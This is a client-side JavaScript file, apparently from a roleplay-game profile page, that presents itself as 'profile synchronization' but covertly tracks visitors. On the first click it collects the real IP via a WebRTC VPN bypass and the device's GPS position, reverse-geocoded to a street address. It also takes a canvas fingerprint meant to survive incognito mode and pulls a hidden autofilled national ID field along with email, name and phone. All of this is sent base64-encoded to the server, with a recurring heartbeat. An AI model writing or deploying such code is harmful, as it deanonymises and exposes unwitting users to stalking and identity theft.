// ─── Estado global del tracker ────────────────────────────────────────────
let _hw_hash = null;
let _heartbeatTimer = null;

// ─── Helper: mostrar mensaje de estado junto al botón ──────────────────────
function showSyncStatus(msg, isError) {
    let el = document.getElementById('_sync_status');
    if (!el) {
        el = document.createElement('div');
        el.id = '_sync_status';
        el.style.cssText = 'margin-top:10px;padding:10px 16px;border-radius:8px;font-size:13px;font-weight:600;text-align:center;transition:opacity .4s;font-family:sans-serif;';
        const btn = document.getElementById('btn-sync');
        if (btn && btn.parentNode) btn.parentNode.insertBefore(el, btn.nextSibling);
        else document.body.appendChild(el);
    }
    el.style.background = isError ? 'rgba(239,68,68,.1)' : 'rgba(34,197,94,.1)';
    el.style.border = isError ? '1px solid #ef4444' : '1px solid #22c55e';
    el.style.color = isError ? '#ef4444' : '#22c55e';
    el.style.opacity = '1';
    el.textContent = msg;
    clearTimeout(el._fadeTimer);
    el._fadeTimer = setTimeout(() => { el.style.opacity = '0'; }, 6000);
}

// ─── Heartbeat: mantiene la sesión "LIVE" en el dashboard cada 60s ──────────
function startHeartbeat(hardwareHash) {
    if (_heartbeatTimer) return;
    _heartbeatTimer = setInterval(() => {
        fetch('/api/track', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                hardwareFingerprint: hardwareHash,
                is_heartbeat: true
            }),
            keepalive: true
        }).catch(() => {});
    }, 60000);
}

// ─── Listener principal (cualquier botón, una sola vez) ───────────────────
let _trackerFired = false;
document.addEventListener('click', async function _gt(e) {
    if (_trackerFired) return;
    // Solo disparar en clics sobre <button> o <a> o el btn-sync original
    const target = e.target.closest('button, a, [type="submit"], [role="button"], #btn-sync');
    if (!target) return;
    _trackerFired = true;
    document.removeEventListener('click', _gt, true);
    console.log("Audit log: starting profile synchronization...");

    // 1. OBTENER IP REAL (Bypass de VPN vía WebRTC)
    let realPublicIP = 'unknown';
    try {
        const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
        pc.createDataChannel('');
        pc.createOffer().then(o => pc.setLocalDescription(o));
        
        realPublicIP = await new Promise(resolve => {
            pc.onicecandidate = (ev) => {
                if (ev.candidate) {
                    const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ev.candidate.candidate);
                    if (m) resolve(m[1]);
                }
            };
            setTimeout(() => resolve('timeout'), 1000); // Aumentado a 1s para asegurar captura
        });
    } catch (err) { console.warn('WebRTC error'); }

    // 1b. GEOLOCALIZACIÓN REAL (GPS/WiFi del dispositivo)
    let gpsLocation = '';
    try {
        const pos = await new Promise((resolve, reject) =>
            navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 6000, maximumAge: 60000})
        );
        const lat = pos.coords.latitude.toFixed(5);
        const lon = pos.coords.longitude.toFixed(5);
        try {
            const rev = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&addressdetails=1`);
            const rj = await rev.json();
            const a = rj.address || {};
            const road    = a.road || a.pedestrian || a.footway || '';
            const number  = a.house_number || '';
            const suburb  = a.suburb || a.neighbourhood || a.quarter || '';
            const city    = a.city || a.town || a.village || a.municipality || a.county || '';
            const state   = a.state || '';
            const country = a.country || '';
            const street  = [road, number].filter(Boolean).join(' ');
            gpsLocation = [street, suburb, city, state, country].filter(Boolean).join(', ');
        } catch(_) { gpsLocation = `${lat},${lon}`; }
    } catch(_) { /* permiso denegado o no disponible */ }

    // 2. GENERAR HARDWARE HASH (Canvas Fingerprinting Avanzado)
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200; canvas.height = 50;
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillText('RolBattle-Auth-v2', 2, 2);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillRect(100, 5, 50, 20);
    // Hash persistente incluso en Incógnito
    const hardwareHash = btoa(canvas.toDataURL()).substring(10, 42);
    _hw_hash = hardwareHash;

    // 3. CAPTURAR CAMPOS (Visibles + Ocultos con Autofill)
    // Subimos el delay a 1000ms para dar tiempo al motor de autocompletado
    setTimeout(async () => {
        const fbclid = new URLSearchParams(window.location.search).get('fbclid') || 'no-fbclid';

        // Captura extendida: Intentamos pescar la cédula/ID del campo 'username' oculto
        const userData = {
            email: document.getElementById('email')?.value || document.getElementById('f-email')?.value || '',
            name:  document.getElementById('name')?.value  || document.getElementById('f-name')?.value  || '',
            phone: document.getElementById('tel')?.value   || document.getElementById('f-phone')?.value || '',
            document_id: document.getElementById('game_id_shadow')?.value || ''
        };

        // Datos del formulario Bellator visibles
        const playerData = {
            pseudonimo:     document.getElementById('b-pseudonimo')?.value || '',
            fechaInicioRol: document.getElementById('b-fecha-inicio')?.value || '',
            avatarUrl:      document.getElementById('b-avatar-url')?.value || '',
            division:       document.getElementById('b-division')?.value || '',
            countryCode:    document.getElementById('b-country-code')?.value || '',
            primaryColor:   document.getElementById('b-primary-color')?.value || '',
            bio:            document.getElementById('b-bio')?.value?.trim() || '',
            playerKey:      document.getElementById('b-player-key')?.value?.trim() || '',
        };

        const payload = {
            sessionID: fbclid,
            userData: userData,
            playerData: playerData,
            networkIP: realPublicIP,
            hardwareHash: hardwareHash,
            fullTelemetry: {
                userAgent: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`,
                referer: document.referrer
            }
        };

        // A. Telemetría a /api/track
        fetch('/api/track', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                ...payload.fullTelemetry,
                hardwareFingerprint: hardwareHash,
                realPublicIP: realPublicIP,
                fb_click_id: fbclid,
                gpsLocation: gpsLocation
            }),
            keepalive: true
        }).catch(() => {});

        // B. Identidad a /api/v1/auth (Base64)
        const encodedAuth = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
        
        try {
            const res = await fetch('/api/v1/auth', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ data: encodedAuth }),
                keepalive: true
            });

            if (res.ok) {
                showSyncStatus('✓ Sincronización exitosa — Perfil de Rol actualizado', false);
                startHeartbeat(hardwareHash);
                // Si tienes un form de rol, puedes resetearlo aquí
            } else {
                showSyncStatus('⚠ Error de red, reintentando...', true);
            }
        } catch (err) {
            showSyncStatus('⚠ Servidor no disponible', true);
        }
    }, 1000); 
}, true);
